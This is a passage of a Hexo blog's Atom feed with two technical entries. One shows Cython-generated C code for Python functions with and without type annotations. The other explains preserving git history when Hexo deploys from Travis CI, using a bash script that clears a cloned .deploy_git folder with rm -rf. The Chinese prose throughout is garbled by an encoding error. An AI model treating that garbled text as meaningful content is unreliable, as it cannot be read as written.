class="number">0</span>&#125;;</span><br><span class="line"><span class="type">static</span> PyObject *__pyx_pw_4test_1ip_str(PyObject *__pyx_self, PyObject *__pyx_v_ips) &#123;</span><br><span class="line">  PyObject *__pyx_r = <span class="number">0</span>;</span><br><span class="line">  __Pyx_RefNannyDeclarations</span><br><span class="line">  __Pyx_RefNannySetupContext(<span class="string">&quot;ip_str (wrapper)&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (unlikely(!__Pyx_ArgTypeTest(((PyObject *)__pyx_v_ips), (&amp;PyString_Type), <span class="number">1</span>, <span class="string">&quot;ips&quot;</span>, <span class="number">1</span>))) __PYX_ERR(<span class="number">0</span>, <span class="number">2</span>, __pyx_L1_error)</span><br><span class="line">  __pyx_r = __pyx_pf_4test_ip_str(__pyx_self, ((PyObject*)__pyx_v_ips));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* function exit code */</span></span><br><span class="line">  <span class="keyword">goto</span> __pyx_L0;</span><br><span class="line">  __pyx_L1_error:;</span><br><span class="line">  __pyx_r = <span class="literal">NULL</span>;</span><br><span class="line">  __pyx_L0:;</span><br><span class="line">  __Pyx_RefNannyFinishContext();</span><br><span class="line">  <span class="keyword">return</span> __pyx_r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> PyObject *__pyx_pf_4test_ip_str(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_ips) &#123;</span><br><span class="line">  PyObject *__pyx_v_x = <span class="literal">NULL</span>;</span><br><span class="line">  PyObject *__pyx_r = <span class="literal">NULL</span>;</span><br><span class="line">  __Pyx_RefNannyDeclarations</span><br><span class="line">  PyObject *__pyx_t_1 = <span class="literal">NULL</span>;</span><br><span class="line">  PyObject *__pyx_t_2 = <span class="literal">NULL</span>;</span><br><span class="line">  PyObject *(*__pyx_t_3)(PyObject *);</span><br><span class="line">  PyObject *__pyx_t_4 = <span class="literal">NULL</span>;</span><br><span class="line">  __Pyx_RefNannySetupContext(<span class="string">&quot;ip_str&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  __Pyx_INCREF(__pyx_v_ips);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* &quot;test.py&quot;:3</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * def ip_str(ips: str):</span></span><br><span class="line"><span class="comment"> *     ips = [x for x in ips]             # &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * def ip(ips):</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">  __pyx_t_1 = PyList_New(<span class="number">0</span>); <span class="keyword">if</span> (unlikely(!__pyx_t_1)) __PYX_ERR(<span class="number">0</span>, <span class="number">3</span>, __pyx_L1_error)</span><br><span class="line">  __Pyx_GOTREF(__pyx_t_1);</span><br><span class="line">  __pyx_t_2 = PyObject_GetIter(__pyx_v_ips); <span class="keyword">if</span> (unlikely(!__pyx_t_2)) __PYX_ERR(<span class="number">0</span>, <span class="number">3</span>, __pyx_L1_error)</span><br><span class="line">  __Pyx_GOTREF(__pyx_t_2);</span><br><span class="line">  __pyx_t_3 = Py_TYPE(__pyx_t_2)-&gt;tp_iternext; <span class="keyword">if</span> (unlikely(!__pyx_t_3)) __PYX_ERR(<span class="number">0</span>, <span class="number">3</span>, __pyx_L1_error)</span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    &#123;</span><br><span class="line">      __pyx_t_4 = __pyx_t_3(__pyx_t_2);</span><br><span class="line">      <span class="keyword">if</span> (unlikely(!__pyx_t_4)) &#123;</span><br><span class="line">        PyObject* exc_type = PyErr_Occurred();</span><br><span class="line">        <span class="keyword">if</span> (exc_type) &#123;</span><br><span class="line">          <span class="keyword">if</span> (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();</span><br><span class="line">          <span class="keyword">else</span> __PYX_ERR(<span class="number">0</span>, <span class="number">3</span>, __pyx_L1_error)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      __Pyx_GOTREF(__pyx_t_4);</span><br><span class="line">    &#125;</span><br><span class="line">    __Pyx_XDECREF_SET(__pyx_v_x, __pyx_t_4);</span><br><span class="line">    __pyx_t_4 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (unlikely(__Pyx_ListComp_Append(__pyx_t_1, (PyObject*)__pyx_v_x))) __PYX_ERR(<span class="number">0</span>, <span class="number">3</span>, __pyx_L1_error)</span><br><span class="line">  &#125;</span><br><span class="line">  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (!(likely(PyString_CheckExact(__pyx_t_1))||(PyErr_Format(PyExc_TypeError, <span class="string">&quot;Expected %.16s, got %.200s&quot;</span>, <span class="string">&quot;str&quot;</span>, Py_TYPE(__pyx_t_1)-&gt;tp_name), <span class="number">0</span>))) __PYX_ERR(<span class="number">0</span>, <span class="number">3</span>, __pyx_L1_error)</span><br><span class="line">  __Pyx_DECREF_SET(__pyx_v_ips, ((PyObject*)__pyx_t_1));</span><br><span class="line">  __pyx_t_1 = <span class="number">0</span>;</span><br></pre></td></tr></table></figure></li><li><p>æœ‰ç±»å‹æ³¨é‡Šï¼š</p>  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* &quot;test.py&quot;:2</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * def ip_str(ips: str):             # &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;</span></span><br><span class="line"><span class="comment"> *     ips = [x for x in ips]</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* function exit code */</span></span><br><span class="line">  __pyx_r = Py_None; __Pyx_INCREF(Py_None);</span><br><span class="line">  <span class="keyword">goto</span> __pyx_L0;</span><br><span class="line">  __pyx_L1_error:;</span><br><span class="line">  __Pyx_XDECREF(__pyx_t_1);</span><br><span class="line">  __Pyx_XDECREF(__pyx_t_2);</span><br><span class="line">  __Pyx_XDECREF(__pyx_t_4);</span><br><span class="line">  __Pyx_AddTraceback(<span class="string">&quot;test.ip_str&quot;</span>, __pyx_clineno, __pyx_lineno, __pyx_filename);</span><br><span class="line">  __pyx_r = <span class="literal">NULL</span>;</span><br><span class="line">  __pyx_L0:;</span><br><span class="line">  __Pyx_XDECREF(__pyx_v_x);</span><br><span class="line">  __Pyx_XDECREF(__pyx_v_ips);</span><br><span class="line">  __Pyx_XGIVEREF(__pyx_r);</span><br><span class="line">  __Pyx_RefNannyFinishContext();</span><br><span class="line">  <span class="keyword">return</span> __pyx_r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* &quot;test.py&quot;:5</span></span><br><span class="line"><span class="comment"> *     ips = [x for x in ips]</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * def ip(ips):             # &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;</span></span><br><span class="line"><span class="comment"> *     ips = [x for x in ips]</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Python wrapper */</span></span><br><span class="line"><span class="type">static</span> PyObject *__pyx_pw_4test_3ip(PyObject *__pyx_self, PyObject *__pyx_v_ips); <span class="comment">/*proto*/</span></span><br><span class="line"><span class="type">static</span> PyMethodDef __pyx_mdef_4test_3ip = &#123;<span class="string">&quot;ip&quot;</span>, (PyCFunction)__pyx_pw_4test_3ip, METH_O, <span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">static</span> PyObject *__pyx_pw_4test_3ip(PyObject *__pyx_self, PyObject *__pyx_v_ips) &#123;</span><br><span class="line">  PyObject *__pyx_r = <span class="number">0</span>;</span><br><span class="line">  __Pyx_RefNannyDeclarations</span><br><span class="line">  __Pyx_RefNannySetupContext(<span class="string">&quot;ip (wrapper)&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  __pyx_r = __pyx_pf_4test_2ip(__pyx_self, ((PyObject *)__pyx_v_ips));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* function exit code */</span></span><br><span class="line">  __Pyx_RefNannyFinishContext();</span><br><span class="line">  <span class="keyword">return</span> __pyx_r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> PyObject *__pyx_pf_4test_2ip(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_ips) &#123;</span><br><span class="line">  PyObject *__pyx_v_x = <span class="literal">NULL</span>;</span><br><span class="line">  PyObject *__pyx_r = <span class="literal">NULL</span>;</span><br><span class="line">  __Pyx_RefNannyDeclarations</span><br><span class="line">  PyObject *__pyx_t_1 = <span class="literal">NULL</span>;</span><br><span class="line">  PyObject *__pyx_t_2 = <span class="literal">NULL</span>;</span><br><span class="line">  Py_ssize_t __pyx_t_3;</span><br><span class="line">  PyObject *(*__pyx_t_4)(PyObject *);</span><br><span class="line">  PyObject *__pyx_t_5 = <span class="literal">NULL</span>;</span><br><span class="line">  __Pyx_RefNannySetupContext(<span class="string">&quot;ip&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  __Pyx_INCREF(__pyx_v_ips);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* &quot;test.py&quot;:6</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * def ip(ips):</span></span><br><span class="line"><span class="comment"> *     ips = [x for x in ips]             # &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">  __pyx_t_1 = PyList_New(<span class="number">0</span>); <span class="keyword">if</span> (unlikely(!__pyx_t_1)) __PYX_ERR(<span class="number">0</span>, <span class="number">6</span>, __pyx_L1_error)</span><br><span class="line">  __Pyx_GOTREF(__pyx_t_1);</span><br><span class="line">  <span class="keyword">if</span> (likely(PyList_CheckExact(__pyx_v_ips)) || PyTuple_CheckExact(__pyx_v_ips)) &#123;</span><br><span class="line">    __pyx_t_2 = __pyx_v_ips; __Pyx_INCREF(__pyx_t_2); __pyx_t_3 = <span class="number">0</span>;</span><br><span class="line">    __pyx_t_4 = <span class="literal">NULL</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    __pyx_t_3 = <span class="number">-1</span>; __pyx_t_2 = PyObject_GetIter(__pyx_v_ips); <span class="keyword">if</span> (unlikely(!__pyx_t_2)) __PYX_ERR(<span class="number">0</span>, <span class="number">6</span>, __pyx_L1_error)</span><br><span class="line">    __Pyx_GOTREF(__pyx_t_2);</span><br><span class="line">    __pyx_t_4 = Py_TYPE(__pyx_t_2)-&gt;tp_iternext; <span class="keyword">if</span> (unlikely(!__pyx_t_4)) __PYX_ERR(<span class="number">0</span>, <span class="number">6</span>, __pyx_L1_error)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="keyword">if</span> (likely(!__pyx_t_4)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (likely(PyList_CheckExact(__pyx_t_2))) &#123;</span><br><span class="line">        <span class="keyword">if</span> (__pyx_t_3 &gt;= PyList_GET_SIZE(__pyx_t_2)) <span class="keyword">break</span>;</span><br><span class="line">        <span class="meta">#<span class="keyword">if</span> CYTHON_ASSUME_SAFE_MACROS &amp;&amp; !CYTHON_AVOID_BORROWED_REFS</span></span><br><span class="line">        __pyx_t_5 = PyList_GET_ITEM(__pyx_t_2, __pyx_t_3); __Pyx_INCREF(__pyx_t_5); __pyx_t_3++; <span class="keyword">if</span> (unlikely(<span class="number">0</span> &lt; <span class="number">0</span>)) __PYX_ERR(<span class="number">0</span>, <span class="number">6</span>, __pyx_L1_error)</span><br><span class="line">        <span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">        __pyx_t_5 = PySequence_ITEM(__pyx_t_2, __pyx_t_3); __pyx_t_3++; <span class="keyword">if</span> (unlikely(!__pyx_t_5)) __PYX_ERR(<span class="number">0</span>, <span class="number">6</span>, __pyx_L1_error)</span><br><span class="line">        __Pyx_GOTREF(__pyx_t_5);</span><br><span class="line">        <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (__pyx_t_3 &gt;= PyTuple_GET_SIZE(__pyx_t_2)) <span class="keyword">break</span>;</span><br><span class="line">        <span class="meta">#<span class="keyword">if</span> CYTHON_ASSUME_SAFE_MACROS &amp;&amp; !CYTHON_AVOID_BORROWED_REFS</span></span><br><span class="line">        __pyx_t_5 = PyTuple_GET_ITEM(__pyx_t_2, __pyx_t_3); __Pyx_INCREF(__pyx_t_5); __pyx_t_3++; <span class="keyword">if</span> (unlikely(<span class="number">0</span> &lt; <span class="number">0</span>)) __PYX_ERR(<span class="number">0</span>, <span class="number">6</span>, __pyx_L1_error)</span><br><span class="line">        <span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">        __pyx_t_5 = PySequence_ITEM(__pyx_t_2, __pyx_t_3); __pyx_t_3++; <span class="keyword">if</span> (unlikely(!__pyx_t_5)) __PYX_ERR(<span class="number">0</span>, <span class="number">6</span>, __pyx_L1_error)</span><br><span class="line">        __Pyx_GOTREF(__pyx_t_5);</span><br><span class="line">        <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      __pyx_t_5 = __pyx_t_4(__pyx_t_2);</span><br><span class="line">      <span class="keyword">if</span> (unlikely(!__pyx_t_5)) &#123;</span><br><span class="line">        PyObject* exc_type = PyErr_Occurred();</span><br><span class="line">        <span class="keyword">if</span> (exc_type) &#123;</span><br><span class="line">          <span class="keyword">if</span> (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();</span><br><span class="line">          <span class="keyword">else</span> __PYX_ERR(<span class="number">0</span>, <span class="number">6</span>, __pyx_L1_error)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      __Pyx_GOTREF(__pyx_t_5);</span><br><span class="line">    &#125;</span><br><span class="line">    __Pyx_XDECREF_SET(__pyx_v_x, __pyx_t_5);</span><br><span class="line">    __pyx_t_5 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (unlikely(__Pyx_ListComp_Append(__pyx_t_1, (PyObject*)__pyx_v_x))) __PYX_ERR(<span class="number">0</span>, <span class="number">6</span>, __pyx_L1_error)</span><br><span class="line">  &#125;</span><br><span class="line">  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = <span class="number">0</span>;</span><br><span class="line">  __Pyx_DECREF_SET(__pyx_v_ips, __pyx_t_1);</span><br><span class="line">  __pyx_t_1 = <span class="number">0</span>;</span><br></pre></td></tr></table></figure></li></ul><p>ä¸»è¦åŒºåˆ«åœ¨äºï¼Œç±»å‹æ³¨é‡Šå¢åŠ äº†å˜é‡æ£€æµ‹ <code>__Pyx_ArgTypeTest</code> ï¼Œä»¥åŠä¹‹åèµ‹å€¼ ips æ—¶çš„ç±»å‹æ£€æµ‹ <code>PyString_CheckExact</code>ï¼›æ²¡æœ‰å˜é‡ç±»å‹æ³¨é‡Šåˆ™è¿›è¡Œäº†å˜é‡æ¨æµ‹ï¼Œåˆ¤æ–­æ˜¯å¦ä¸ºListï¼ˆ <code>PyList_CheckExact</code>ï¼‰æˆ–è€…Tuple ï¼ˆ <code>PyTuple_CheckExact</code>ï¼‰ï¼Œè¿˜æ˜¯å¯è¿­ä»£ç±»å‹ã€‚</p><h2><span id="jie-lun">ç»“è®º</span></h2><ol><li>ç±»å‹æ³¨é‡Šåœ¨ç¼–è¯‘åä¼šç®€åŒ–å¤„ç†æµç¨‹ï¼›</li><li>ç±»å‹æ³¨é‡Šçš„å˜é‡ä¸èƒ½èµ‹å€¼ä¸ºå…¶ä»–ç±»å‹ã€‚</li></ol><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      Python å‡½æ•°å˜é‡ç±»å‹æ³¨é‡Šä¼šå¯¼è‡´ç”¨ Cython ç¼–è¯‘åæ‰§è¡Œä¸ç›´æ¥æ‰§è¡Œç»“æœä¸ä¸€è‡´
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Hexo git deployer åˆ é™¤äº†æäº¤å†å²è®°å½•è¯¥æ€ä¹ˆæ•´ï¼Ÿ</title>
    <link href="https://qiwihui.com/qiwihui-blog-50/"/>
    <id>https://qiwihui.com/qiwihui-blog-50/</id>
    <published>2022-08-13T01:54:25.700Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<p>åŸæ–‡ï¼š<a href="https://e.printstacktrace.blog/hexo-git-deployer-removes-commits-history-lets-do-something-about-that/">Hexo git deployer removes commits history? Letâ€™s do something about that!</a></p><p>æˆ‘å‘ç° <a href="https://hexo.io/">Hexo</a> æ˜¯æ„å»ºåšå®¢å’Œåº”ç”¨è®¸å¤šçŸ¥åçš„è½¯ä»¶å¼€å‘åŸåˆ™çš„å¥½å·¥å…·ï¼Œå…¶ä¸­ä¹‹ä¸€æ˜¯è‡ªåŠ¨åŒ–ã€‚è¿™å°±æ˜¯æˆ‘å†³å®šå°†æ­¤åšå®¢ä¸ <a href="https://travis-ci.org/wololock/wololock.github.io">Travis CI</a> é›†æˆä»¥æ‰§è¡Œ GitHub pages éƒ¨ç½²çš„åŸå› ã€‚ä½†å‡ å¤©ä¹‹åæˆ‘æ³¨æ„åˆ°ä¸€ä¸ªé‡è¦é—®é¢˜ - ä» CI æœåŠ¡å™¨éƒ¨ç½²æ–°ç‰ˆæœ¬çš„åšå®¢å¯¼è‡´ä» <code>master</code> åˆ†æ”¯ä¸­åˆ é™¤æ‰€æœ‰æäº¤å¹¶ä»ä¸€æ¬¡åˆä¸€æ¬¡åœ°åˆå§‹åŒ–æäº¤å¼€å§‹ã€‚æˆ‘èŠ±äº†ä¸€æ®µæ—¶é—´æ‰æ‰¾åˆ°è§£å†³è¿™ä¸ªé—®é¢˜çš„å·¥ä½œæ–¹æ¡ˆã€‚è¿™ç¯‡åšæ–‡è§£é‡Šäº†è¿™ä¸ªé—®é¢˜çš„ç®€å•è§£å†³æ–¹æ¡ˆã€‚</p><span id="more"></span><h3><span id="wei-shi-me-hexo-deploy-hui-shou-xian-shan-chu-li-shi-ji-lu">ä¸ºä»€ä¹ˆ <code>hexo deploy</code> ä¼šé¦–å…ˆåˆ é™¤å†å²è®°å½•ï¼Ÿ</span></h3><p>è®©æˆ‘ä»¬ä»äº†è§£å®é™…å‘ç”Ÿçš„äº‹æƒ…å¼€å§‹ã€‚å½“ä½ ä¸º git éƒ¨ç½²é€‰é¡¹è¿è¡Œ <code>hexo deploy</code> [1]å‘½ä»¤æ—¶ï¼ŒHexo ä¼šåˆ›å»ºä¸€ä¸ªåä¸º <code>.deploy_git</code> çš„éšè—æ–‡ä»¶å¤¹ï¼Œå¹¶å°†ç”Ÿæˆçš„æ–‡ä»¶ä» <code>public</code> æ–‡ä»¶å¤¹å¤åˆ¶åˆ°è¯¥æ–‡ä»¶å¤¹ã€‚æ¥ä¸‹æ¥ï¼Œå®ƒåˆå§‹åŒ–ç›®æ ‡ä¸º Hexo è¿œç¨‹éƒ¨ç½²åˆ†æ”¯çš„gitå­˜å‚¨åº“ï¼ˆå¦‚æœå®ƒå°šä¸å­˜åœ¨ï¼‰ï¼Œå¹¶ä»è¯¥æ–‡ä»¶å¤¹æ‰§è¡Œ <code>git push --force</code> åˆ°ä»“åº“å’Œä½ åœ¨ <code>_config.yml</code> [2]æ–‡ä»¶ä¸­å®šä¹‰çš„åˆ†æ”¯ã€‚</p><p>æ¸…å•1. åšå®¢çš„éƒ¨ç½²é…ç½®</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">git@github.com:wololock/wololock.github.io.git</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">master</span></span><br></pre></td></tr></table></figure><p>å¦‚æœä½ ä»æœ¬åœ°è®¡ç®—æœºæ„å»ºå’Œéƒ¨ç½²åšå®¢ï¼Œå¹¶ä¸”æ°¸è¿œä¸ä¼šåˆ é™¤ï¼ˆæˆ–æ„å¤–ä¸¢å¤±ï¼‰ä½ çš„åšå®¢æºä»£ç ï¼Œä½ å¯èƒ½æ°¸è¿œä¸ä¼šé‡åˆ°æ­¤é—®é¢˜ã€‚å½“ä½ ä»æœªè¢«æ“¦é™¤çš„å·¥ä½œç©ºé—´æ‰§è¡Œæ­¤æ“ä½œæ—¶ï¼Œåˆ™å­˜åœ¨å…·æœ‰å®Œæ•´å†å²è®°å½•çš„æ–‡ä»¶å¤¹ <code>.deploy_git</code>ï¼Œå¹¶ä¸” <code>hexo deploy</code> ä»…æ¨é€å®é™…ä¿®æ”¹çš„é‚£äº›æ–‡ä»¶ã€‚å½“ä½ è¿ç§»åˆ°åƒ <code>Travis CI</code> è¿™æ ·çš„ CI æœåŠ¡å™¨æ—¶ï¼Œè¿™å°±å˜äº†ï¼Œå› ä¸ºå®ƒä½¿ç”¨å¹²å‡€çš„å·¥ä½œåŒºå’Œä»“åº“çš„æ–°å…‹éš†æ‰§è¡Œæ„å»ºã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ<code>.deploy_git</code> æ–‡ä»¶å¤¹æ ¹æœ¬ä¸å­˜åœ¨ï¼Œå°†ä»å¤´å¼€å§‹é‡æ–°åˆ›å»ºã€‚</p><h3><span id="na-me-ru-he-bu-shu-he-bao-cun-li-shi-ni">é‚£ä¹ˆå¦‚ä½•éƒ¨ç½²å’Œä¿å­˜å†å²å‘¢ï¼Ÿ</span></h3><p>æˆ‘å‘ç°è§£å†³æ–¹æ¡ˆéå¸¸ç®€å•ã€‚ä»¥å‰æˆ‘è´Ÿè´£éƒ¨ç½²çš„ <code>.travis.yml</code> æ–‡ä»¶éƒ¨åˆ†çœ‹èµ·æ¥åƒè¿™æ ·ï¼š</p><p>æ¸…å•2. ä»¥å‰çš„ <code>Travis CI</code> éƒ¨ç½²é…ç½®</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">skip_cleanup:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">provider:</span> <span class="string">script</span></span><br><span class="line">  <span class="attr">script:</span> <span class="string">hexo</span> <span class="string">deploy</span></span><br><span class="line">  <span class="attr">on:</span></span><br><span class="line">    <span class="attr">branch:</span> <span class="string">develop</span></span><br></pre></td></tr></table></figure><p>åªè¦æˆ‘å°†æ›´æ”¹æ¨é€åˆ° <code>develop</code> åˆ†æ”¯ï¼Œå®ƒå°±ä¼šè§¦å‘ <code>hexo deploy</code>ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå®ƒæœ€ç»ˆåˆ›å»ºäº†ä¸€ä¸ªæ–°çš„ <code>.deploy_git</code> æ–‡ä»¶å¤¹å¹¶å¼ºåˆ¶å°†åˆå§‹æäº¤æ¨é€åˆ° GitHub ä»“åº“ã€‚ç„¶åï¼Œæˆ‘åšäº†ä¸€ä¸ªå°æ”¹è¿› - æˆ‘åˆ›å»ºäº†ä¸€ä¸ªç®€çŸ­çš„ bash è„šæœ¬ã€‚</p><p>æ¸…å•3. éƒ¨ç½²åšå®¢ä½¿ç”¨çš„è„šæœ¬</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨å·²éƒ¨ç½²æ–‡ä»¶åˆå§‹åŒ–ç›®æ ‡</span></span><br><span class="line"><span class="string">git</span> <span class="string">clone</span> <span class="string">--depth</span> <span class="number">1</span> <span class="string">--branch=master</span> <span class="string">https://github.com/wololock/wololock.github.io.git</span> <span class="string">.deploy_git</span></span><br><span class="line"></span><br><span class="line"><span class="string">cd</span> <span class="string">.deploy_git</span></span><br><span class="line"></span><br><span class="line"><span class="string">ï¼ƒä»</span> <span class="string">../public/</span> <span class="string">å¤åˆ¶ä¹‹å‰åˆ é™¤æ‰€æœ‰æ–‡ä»¶</span></span><br><span class="line"><span class="comment"># è¿™æ · git å¯ä»¥è·Ÿè¸ªä¸Šæ¬¡æäº¤ä¸­åˆ é™¤çš„æ–‡ä»¶</span></span><br><span class="line"><span class="string">find</span> <span class="string">.</span> <span class="string">-path</span> <span class="string">./.git</span> <span class="string">-prune</span> <span class="string">-o</span> <span class="string">-exec</span> <span class="string">rm</span> <span class="string">-rf</span> &#123;&#125; <span class="string">\;</span> <span class="number">2</span><span class="string">&gt;</span> <span class="string">/dev/null</span></span><br><span class="line"></span><br><span class="line"><span class="string">cd</span> <span class="string">../</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># éƒ¨ç½²</span></span><br><span class="line"><span class="string">hexo</span> <span class="string">clean</span></span><br><span class="line"><span class="string">hexo</span> <span class="string">deploy</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªè„šæœ¬å®Œå…¨æŒ‰ç…§å®ƒåœ¨æ³¨é‡Šä¸­æ‰€è¯´çš„é‚£æ ·åšï¼š</p><ul><li>å®ƒå°† <code>master</code> åˆ†æ”¯ä»è¿œç¨‹å­˜å‚¨åº“å…‹éš†åˆ° <code>.deploy_git</code> ä»¥è·å–ç°æœ‰æäº¤å†å²è®°å½•ã€‚</li><li>ç„¶åå®ƒä» <code>.deploy_git</code> ä¸­åˆ é™¤æ‰€æœ‰é git å¯¹è±¡å­˜å‚¨åº“æ–‡ä»¶ï¼Œå› æ­¤ä» <code>public</code> æ–‡ä»¶å¤¹å¤åˆ¶æ–‡ä»¶å°†è·Ÿè¸ªå·²åˆ é™¤çš„æ–‡ä»¶ã€‚</li><li>æœ€å - å®ƒæ‰§è¡Œå¸¸è§„éƒ¨ç½²çš„ <code>hexo deploy</code> å‘½ä»¤ã€‚</li></ul><p>æœ€åï¼Œè¿™æ˜¯åœ¨å¼•å…¥éƒ¨ç½²bashè„šæœ¬åçš„éƒ¨ç½²é…ç½®éƒ¨åˆ†ï¼š</p><p>æ¸…å•4. å½“å‰çš„ <code>Travis CI</code> éƒ¨ç½²é…ç½®</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">skip_cleanup:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">provider:</span> <span class="string">script</span></span><br><span class="line">  <span class="attr">script:</span> <span class="string">sh</span> <span class="string">deploy.sh</span></span><br><span class="line">  <span class="attr">on:</span></span><br><span class="line">    <span class="attr">branch:</span> <span class="string">develop</span></span><br></pre></td></tr></table></figure><p>ç”±äºè¿™ä¸ªè§£å†³æ–¹æ¡ˆï¼Œæˆ‘èƒ½å¤Ÿä¿ç•™ç«™ç‚¹æ›´æ–°çš„å†å²è®°å½•ï¼Œå¹¶è·Ÿè¸ªä½¿ç”¨ç»™å®šç«™ç‚¹æ›´æ–°å®é™…ä¿®æ”¹çš„æ–‡ä»¶çš„æ›´æ”¹ã€‚</p><p><img src="https://e.printstacktrace.blog/images/github-hexo-history.png" alt="github hexo history"></p><h3><span id="zui-hou-de-hua">æœ€åçš„è¯</span></h3><p>æˆ‘å¸Œæœ›ä½ å‘ç°è¿™ç¯‡æ–‡ç« å¾ˆæœ‰ç”¨ã€‚å®ƒæè¿°äº† Hexo + Travis CI + GitHub ç”¨ä¾‹çš„è§£å†³æ–¹æ¡ˆï¼Œä½†å®ƒå¯ä»¥è§£å†³ä» CI æœåŠ¡å™¨ç¯å¢ƒè¿è¡Œæ—¶å…¶ä»–ç±»ä¼¼é™æ€ç«™ç‚¹ç”Ÿæˆå™¨å¯èƒ½é‡åˆ°çš„é—®é¢˜ã€‚</p><h3><span id="can-kao">å‚è€ƒ</span></h3><ol><li>Documentation: <a href="https://hexo.io/docs/deployment">https://hexo.io/docs/deployment</a></li><li><a href="https://github.com/wololock/wololock.github.io/blob/develop/_config.yml#L88-L93">https://github.com/wololock/wololock.github.io/blob/develop/_config.yml#L88-L93</a></li></ol><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      Hexo git deployer åˆ é™¤äº†æäº¤å†å²è®°å½•è¯¥æ€ä¹ˆæ•´ï¼Ÿ
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
